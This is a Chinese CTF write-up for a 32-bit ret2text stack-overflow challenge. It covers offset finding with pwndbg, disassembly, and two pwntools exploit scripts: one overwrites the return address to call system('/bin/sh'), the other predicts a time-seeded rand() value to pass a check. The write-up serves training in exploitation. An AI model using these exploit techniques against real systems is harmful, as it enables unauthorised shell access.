# ret2text_32

- 作者：pn1fg
- 参考：[ctfwiki/ctf-challenges](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text)
- 难度：Normal
- 分类：Pwn
- 镜像：-
- 端口：70

## 题目描述

32 位栈溢出

## 题目解析

- 源码：[ret2text_32.c](build/ret2text_32.c)
- 考点：32 位下的 ROP - ret2text

`ret2text` 即 *Return to .text*，控制程序**返回**到程序 `.text` 段执行**已有的代码**。

其实不止可以控制程序执行已有的相邻的代码，还可以控制程序执行好几段**不相邻**的代码 ( Gadgets )，这就是我们所要说的 ROP（Return-Oriented Programming，返回导向编程）。

______________________________________________________________________

现在来到了“真正意义”上的 Pwn 题，我们需要输入特定的数据，破坏程序的执行流程，执行我们想要的代码，当然程序也可能会开启某些保护，我们需要想办法去绕过它们，不过这里暂时还没有。

不同于前几题，从这题开始要求有基本的反编译、调试程序能力，了解文件基本结构、程序的加载和执行流程，毕竟是题解，不是教程。\
工具使用方面不会赘述，自行学习。\
（但本题会详细一些，往后没有了）

### 查看文件信息

查看文件类型（`file` 命令 ）：

```
>>> file ret2text_32
ret2text_32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=987703b7d96b2e86eaf37a48d18dfd9b780a8cea, not stripped
```

这是一个 32 位的 ELF 文件（`ELF 32-bit LSB executable`），动态链接（ `dynamically linked` ），没有去除符号（ `not stripped` ）。

查看保护机制（`checksec` 命令 ）：

```
>>> checksec --file=ret2text_32
RELRO           Partial RELRO   
STACK CANARY    No canary found  
NX              NX enabled
PIE             No PIE
RPATH           No RPATH
RUNPATH         No RUNPATH
Symbols         78 Symbols
FORTIFY         No
Fortified       0       
Fortifiable     1
FILE            ret2text_32
```

只打开了 NX 保护，栈不可执行，所以在溢出后需要使用 ROP 的技巧。

### 分析漏洞成因

反编译 `vuln` 函数：

```c
void sym.vuln(void)

{
    uint s;  // ebp-0x6c

    sym.imp.puts("There is something amazing here, do you know anything?");
    sym.imp.gets(&s);
    sym.imp.puts("Maybe I will tell you next time !");
    return;
}
```

`gets` 函数可以读入无限制长度的字符（直到换行 `\n`），导致超出 `s` 的长度，覆盖 `ebp` 的值，并继续覆盖函数的返回地址。

使用 gdb + pwndbg 调试，在 `0x08048703` 处打断点，输入很长的一串字符，这是栈的情况：

```
pwndbg> stack 50
00:0000│ esp 0xffffd550 —▸ 0xffffd56c ◂— 'aaaa...daab'
01:0004│     0xffffd554 ◂— 0x0
02:0008│     0xffffd558 —▸ 0xffffd580 ◂— 'faaa...daab'
03:000c│     0xffffd55c ◂— 0x386
04:0010│     0xffffd560 —▸ 0xf7e44d40 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│     0xffffd564 —▸ 0x804a064 (stdout@@GLIBC_2.0) —▸ 0xf7e44d40 (_IO_2_1_stdout_) ◂— 0xfbad2887
06:0018│     0xffffd568 —▸ 0xffffd5b8 ◂— 'taaauaaavaaawaaaxaaayaaazaabbaabcaabdaab'
07:001c│ eax 0xffffd56c ◂— 'aaaa'
08:0020│     0xffffd570 ◂— 'baaa'
09:0024│     0xffffd574 ◂— 'caaa'
0a:0028│     0xffffd578 ◂— 'daaa'
0b:002c│     0xffffd57c ◂— 'eaaa'
0c:0030│     0xffffd580 ◂— 'faaa'
0d:0034│     0xffffd584 ◂— 'gaaa'
0e:0038│     0xffffd588 ◂— 'haaa'
0f:003c│     0xffffd58c ◂— 'iaaa'
10:0040│     0xffffd590 ◂— 'jaaa'
11:0044│     0xffffd594 ◂— 'kaaa'
12:0048│     0xffffd598 ◂— 'laaa'
13:004c│     0xffffd59c ◂— 'maaa'
14:0050│     0xffffd5a0 ◂— 'naaa'
15:0054│     0xffffd5a4 ◂— 'oaaa'
16:0058│     0xffffd5a8 ◂— 'paaa'
17:005c│     0xffffd5ac ◂— 'qaaa'
18:0060│     0xffffd5b0 ◂— 'raaa'
19:0064│     0xffffd5b4 ◂— 'saaa'
1a:0068│     0xffffd5b8 ◂— 'taaa
1b:006c│     0xffffd5bc ◂— 'uaaa'
1c:0070│     0xffffd5c0 ◂— 'vaaa'
1d:0074│     0xffffd5c4 ◂— 'waaa'
1e:0078│     0xffffd5c8 ◂— 'xaaa'
1f:007c│     0xffffd5cc ◂— 'yaaa'
20:0080│     0xffffd5d0 ◂— 'zaab'
21:0084│     0xffffd5d4 ◂— 'baab'
22:0088│ ebp 0xffffd5d8 ◂— 'caab'
23:008c│     0xffffd5dc ◂— 'daab'
```

我们输入的 `s` 距离 `ebp` 寄存器 `0xffffd5d8 - 0xffffd56c = 0x6c`，与反编译时的输出一致。

当输入 `0x6c` 个字符后，再输入 4 个字符，可以完全覆盖 `ebp`，继续输入 4 个字符，即可**覆盖返回地址**，这是 ROP 的基石。

### 构造利用载荷

那么返回到哪呢？继续查看程序中其他函数。

列出所有函数：

```
[0x08048711]> afl
0x080484f0    1     50 entry0
0x08048523    1      4 fcn.08048523
0x080484a0    1      6 sym.imp.__libc_start_main
0x08048550    4     42 sym.deregister_tm_clones
0x08048580    4     55 sym.register_tm_clones
0x080485c0    3     30 sym.__do_global_dtors_aux
0x080485e0    4     44 sym.frame_dummy
0x08048790    1      2 sym.__libc_csu_fini
0x08048540    1      4 sym.__x86.get_pc_thunk.bx
0x080486e3    1     46 sym.vuln
0x08048470    1      6 sym.imp.puts
0x08048450    1      6 sym.imp.gets
0x08048794    1     20 sym._fini
0x08048684    1     20 sym.banner
0x08048698    3     75 sym.secure
0x08048460    1      6 sym.imp.time
0x08048490    1      6 sym.imp.srand
0x080484c0    1      6 sym.imp.rand
0x080484d0    1      6 sym.imp.__isoc99_scanf
0x08048480    1      6 sym.imp.system
0x0804860d    1    119 sym.init
0x080484b0    1      6 sym.imp.setvbuf
0x08048730    4     93 sym.__libc_csu_init
0x08048530    1      2 sym._dl_relocate_static_pie
0x08048711    1     28 main
0x08048418    3     35 sym._init
0x080484e0    1      6 sym..plt.got
```

反编译 `secure` 函数：

```c
[0x08048711]> pdg @ sym.secure

void sym.secure(void)

{
    uint uVar1;
    int32_t var_10h;
    int32_t var_ch;

    uVar1 = sym.imp.time(0);
    sym.imp.srand(uVar1);
    var_ch = sym.imp.rand();
    sym.imp.__isoc99_scanf(0x8048b37, &var_10h);
    if (var_10h == var_ch) {
        sym.imp.system("/bin/sh");
    }
    return;
}
```

以当前时间为种子，生成一个随机数，使用 `scanf` 读取一个数与随机数比较，相等就执行 `/bin/sh` 获得 shell 。

它的汇编如下：

```asm
[0x08048711]> pdf @ sym.secure
┌ 75: sym.secure ();
│           ; var uint32_t var_ch @ ebp-0xc
│           ; var int32_t var_10h @ ebp-0x10
│           ; var int32_t var_4h @ esp+0x4
│           0x08048698      55             push ebp
│           0x08048699      89e5           mov ebp, esp
│           0x0804869b      83ec28         sub esp, 0x28
│           0x0804869e      c70424000000.  mov dword [esp], 0          ; time_t *timer
│           0x080486a5      e8b6fdffff     call sym.imp.time           ; time_t time(time_t *timer)
│           0x080486aa      890424         mov dword [esp], eax        ; int seed
│           0x080486ad      e8defdffff     call sym.imp.srand          ; void srand(int seed)
│           0x080486b2      e809feffff     call sym.imp.rand           ; int rand(void)
│           0x080486b7      8945f4         mov dword [var_ch], eax
│           0x080486ba      8d45f0         lea eax, [var_10h]
│           0x080486bd      89442404       mov dword [var_4h], eax
│           0x080486c1      c70424378b04.  mov dword [esp], 0x8048b37  ; [0x8048b37:4]=0x2f006425 ; "%d" ; const char *format
│           0x080486c8      e803feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x080486cd      8b45f0         mov eax, dword [var_10h]
│           0x080486d0      3b45f4         cmp eax, dword [var_ch]
│       ┌─< 0x080486d3      750c           jne 0x80486e1
│       │   0x080486d5      c704243a8b04.  mov dword [esp], str._bin_sh ; [0x8048b3a:4]=0x6e69622f ; "/bin/sh" ; const char *string
│       │   0x080486dc      e89ffdffff     call sym.imp.system         ; int system(const char *string)
│       │   ; CODE XREF from sym.secure @ 0x80486d3(x)
│       └─> 0x080486e1      c9             leave
└           0x080486e2      c3             ret
```

我们可以覆盖返回地址为 `0x080486d5`，直接执行 `mov dword [esp], str._bin_sh` 和 `call sym.imp.system` ，合起来也就是 `system("/bin/sh")`。

于是可以构造一个 payload（攻击载荷）：

```
|<--      padding       ->| + |<- fake ebp ->| + |<- return address ->| + |<- newline -->|
aaaabaaacaaa...yaaazaaabaab +       caab       +    \xd5\x86\x04\x08    +      \x0a       
|          0x6c           |   |     0x4      |   |        0x4         |   |     0x1      |
```

之所以需要 `\x0a` 是因为 `gets` 函数需要遇到换行符才结束读取，这个符号不会被它算在读入的字符串内，只当作输入的结束。\
`ebp` 的值不需去管它。

### 编写利用程序

放在了 [exp.py](writeup/exp.py)

```python
from pwn import *

context.log_level = "debug"

io = process("./ret2text_32")
payload = flat([cyclic(0x6C + 4), 0x080486D5])
io.sendlineafter(b"anything?\n", payload)
io.interactive()
```

只是 `pwntools` 的基本使用，开启 `debug` 模式的日志输出对学习和调试有很大帮助，可以观察看看和我上面所写的 payload 是不是差不多。

______________________________________________________________________

这里还有另一种解法。

之前是覆盖返回到调用 system 的代码段，现在选择覆盖返回到调用 `secure` 函数，然后程序会要求读入一个与随机数相同的数才能执行 `/bin/sh` ，我们要做的就是——**预测随机数**。

```c
uVar1 = sym.imp.time(0);
sym.imp.srand(uVar1);
var_ch = sym.imp.rand();
```

只是使用 `time(0)` 生成当前系统时间作为随机数种子，在这个情况下是不安全的。如果在极短的时间内多次调用 `time(0)` 会得到相同的种子值，继而导致生成的随机数一致。\
（其实并没有“极短”，因为时间的分辨率通常是秒级别的）

所以说，我们在调用 `process("./xxx")` 或者 `remote("xxx", xxx)` 的同时（时间间隔很近就可以了），使用 `time(0)` 作为随机数种子生成随机数，再覆盖返回地址为 `secure` 函数的地址，最后输入预测的随机数值，就可以得到 shell 了。

代码如下：

[exp2.py](writeup/exp2.py)

```python
from pwn import *
from ctypes import cdll

context.log_level = "debug"

elf = ELF("./ret2text_32")

libc = cdll.LoadLibrary("libc.so.6")
libc.srand(libc.time(0))
number = libc.rand()

io = remote('', 32793)
payload = flat([cyclic(0x6C+4), elf.sym["secure"]])
io.sendlineafter(b"anything?\n", payload)
io.sendline(str(number).encode())

io.interactive()
```

我尽量将生成随机数的 `libc.rand()` 与和远程建立连接的 `remote()` 放在近的地方，并且 `libc.rand()` 在 `remote()` 前面，避免远程某些 I/O 太耗时，导致本地生成随机数的时候已经晚了。\
这都是为了尽可能使用同样的随机数种子，继而生成同样的随机数。\
（所以说网络延迟高的时候不要用这个方法）

这里是用的 `ctypes`，你写一个 C 语言程序编译好可执行文件，然后在 Python 中调用命令获取程序输出的随机数，也是可以的。
